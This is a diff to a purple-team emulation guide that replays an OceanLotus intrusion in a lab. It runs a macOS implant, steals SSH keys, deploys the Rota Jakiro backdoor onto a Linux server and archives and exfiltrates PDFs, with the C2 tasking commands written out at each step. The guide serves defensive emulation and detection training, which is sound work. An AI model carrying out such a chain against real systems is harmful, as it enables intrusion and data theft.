@@ -10,10 +10,10 @@ used by or associated with the OceanLotus actors:
 This document is intended to be used as a operational guide for a purple team operation. 
 
 Based on the CTI Emulation Plan, each step includes the following information:
-- :microphone: **Voice Track** - Summuary of actions that are completed in this step
-- :biohazard: **Procedures** - Red team operator instructions & commands to execute with expected output
-- 🔮 **Source Code & Intelligence** - A table with links to the source code for specific actions with cited intelligence leveraged for this action (if available)
-- 🔍 **Blue Team Notes** - key API calls, events, or telemtry for blue teams
+- 📖 **Overview** - Summuary of actions that are completed in this step
+- 👾 **Red Team Procedures** - Red team operator instructions & commands to execute with expected output
+- 🔮 **Reference Code & Reporting** - A table with links to the source code for specific actions with cited intelligence leveraged for this action (if available)
+- 🔬 **Blue Team Notes** - key API calls, events, or telemtry for blue teams
 
 In-line Symbols:
 * :bulb: - callout notes
@@ -23,12 +23,23 @@ In-line Symbols:
 
 
 ---
-## Step 0 - Setup
+## Step 0 - Operation Setup
 
-### 📖 Voice Track
+### 📖 Overview
+This step assumes you have completed the infrastructure [setup](../setup/README.md). At the end of this step a Red Team operator should be able to execute the emulation plan by copying and pasting the commands into the correct terminal window with all required programs running. 
+
+Actions completed in this step:
+- Login to the attacker Kali machine via SSH
+- Start the control server
+- Set up attacker terminal windows for execution
+- Login to the macOS VM on AWS - Required for step 1
+
+At the end of this step the Attacker C2 should be listening for the implant callback and the red team operator should have terminal windows set up to manage the operation. 
+
+---
+### 👾 Red Team Procedures
 
 #### Kali Setup
-
 Ensure OceanLotus GitHub repo is cloned to the Kali host and infrastrucre is set up according to the infrastructure.md (This includes ensure the handlers are configured correctly in the `config/handler_config.yml` file)
 
 1. ssh to the Kali box hosting our C2 server in AWS
@@ -84,36 +95,31 @@ Ensure OceanLotus GitHub repo is cloned to the Kali host and infrastrucre is set
 1. Enter the password manually
 1. Verify the conkylan.app file (unicorn in Vietnamese) resides on the downloads folder. 
 
----
+## Step 1 - It began with a double-click
+### 📖 Overview
+👋 Handwaving: Assume the user downloaded the conkylan.app (unicorn in Vietnamese) and it  resides on the user's `Downloads` folder. 
 
-### :biohazard: Procedures
-- Login to the AWS env - macOS
-- Tests & make sure everthing is this
-- Intro to story, background, naming, & context
-
-## Step 1 - Initial Compromise and Persistence
-### :microphone: Voice Track
-Assume download of conkylan.app (unicorn in Vietnamese) resides on the downloads folder. 
+The user double-clicks the conkylan.app (note: We were not able to implement the homoglyph file extension due to updates from by apple 🙌 🍎) thinking it's a normal document. 
 
 ---
-### :biohazard: Procedures
+### 👾 Red Team Procedures
 - Double click the conkylan.app
 Confirm C2 Registration of the OSX implant 
-### 🔮 Source Code & Intelligence
+### 🔮 Reference Code & Reporting
 <br>
 
-### 🔍 Blue Team Notes
+### 🔬 Blue Team Notes
 <br>
 
 ## Step 2 - Discovery on macOS
-### :microphone: Voice Track
+### 📖 Overview
 Discovery on MacOS host:
 ssh keys
 known hosts
 history
 
 ---
-### :biohazard: Procedures
+### 👾 Red Team Procedures
 
 Confirm an SSH key is in /.ssh folder
 ```zsh
@@ -134,14 +140,14 @@ Expected output:
 ```
 ```
 
-### 🔮 Source Code & Intelligence
+### 🔮 Reference Code & Reporting
 <br>
 
-### 🔍 Blue Team Notes
+### 🔬 Blue Team Notes
 <br>
 
 ## Step 3 - Deploy Rota Jakiro
-### :microphone: Voice Track
+### 📖 Overview
 Identified the macOS connects to a Linux file server. 
  
 Download Rota Jakiro and scp Rota Jakiro to the Linux server
@@ -149,7 +155,7 @@ Download Rota Jakiro and scp Rota Jakiro to the Linux server
 Execute Rota Jakiro
 
 ---
-### :biohazard: Procedures
+### 👾 Red Team Procedures
 Task OceanLotus to download Rota Jakiro to the macOS Host
 ```
 ./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
@@ -187,33 +193,33 @@ Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
 
 Confirm C2 Registration of Rota on the C2 Server
 
-### 🔮 Source Code & Intelligence
+### 🔮 Reference Code & Reporting
 <br>
 
-### 🔍 Blue Team Notes
+### 🔬 Blue Team Notes
 <br>
 
 
 ## Step 4 - Discovery on Linux Host
-### :microphone: Voice Track
+### 📖 Overview
 Discover on Linux Host: 
 Upload device info
 
 ---
-### :biohazard: Procedures
+### 👾 Red Team Procedures
 `./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'`
 
 Confirm device info is printed out
 
-### 🔮 Source Code & Intelligence
+### 🔮 Reference Code & Reporting
 <br>
 
-### 🔍 Blue Team Notes
+### 🔬 Blue Team Notes
 <br>
 
 
 ## Step 5 - Collection
-### :microphone: Voice Track
+### 📖 Overview
 Execute a shared object that includes: 
 create tmp.rota folder 
 move everything into the folder that is a .pdf extension 
@@ -221,34 +227,34 @@ tar all the .pdfs in the folder (exilf.tar.gz)
 Confirm files were created
 
 ---
-### :biohazard: Procedures
+### 👾 Red Team Procedures
 Execute:
 
 run file query command, ensure files & folder exist 
 Confirm: 
 `./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_query_file", "arg": "/tmp/.rota/exfil.tar.gz"}'`
 
-### 🔮 Source Code & Intelligence
+### 🔮 Reference Code & Reporting
 <br>
 
-### 🔍 Blue Team Notes
+### 🔬 Blue Team Notes
 <br>
 
 
 ## Step 6 - Exfil from Linux Host
-### :microphone: Voice Track
+### 📖 Overview
 Execute another shared object that includes: 
 Uploading the tar file from the folder
 
 ---
-### :biohazard: Procedures
+### 👾 Red Team Procedures
 `./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_file", "payload": "payload.so"}'`
 Confirm upload of file to server 
 
-### 🔮 Source Code & Intelligence
+### 🔮 Reference Code & Reporting
 <br>
 
-### 🔍 Blue Team Notes
+### 🔬 Blue Team Notes
 <br>
 
 
